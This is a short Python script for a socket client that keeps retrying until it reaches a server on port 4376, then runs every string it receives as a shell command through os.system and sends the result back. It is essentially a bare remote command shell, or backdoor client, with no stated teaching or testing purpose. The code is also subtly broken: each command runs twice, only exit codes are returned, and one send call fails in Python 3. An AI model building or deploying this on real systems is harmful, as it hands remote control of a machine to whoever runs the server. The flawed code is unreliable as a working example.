import socket
import os
import sys

def client_program():
    host = socket.gethostname()
    port = 4376

    client_socket = socket.socket()
    notconnected = True
    while notconnected:
        try:
            client_socket.connect((host, port))
            notconnected = False
        except:
            print("Connecting:")
    try:
        print("Connection Established")
        message = "\nConnected"
        client_socket.send(str(message).encode('UTF-8'))
        while True:
            data = client_socket.recv(2408).decode()
            if data=='exit':
                print("Exiting")
                break
            else:
                print('Received from server: ' + data)
                print(os.system(data))
                try:
                    message = os.system(data)
                    print (message)
                    client_socket.sendall(str(message).encode('UTF-8'))
                except:
                    client_socket.sendall("Invalid Command or Syntax")


        client_socket.close()  # close the connection
    except Exception as e:
        print(e)
        print (sys.exc_info()[-1].tb_lineno)

if __name__ == '__main__':
    client_program()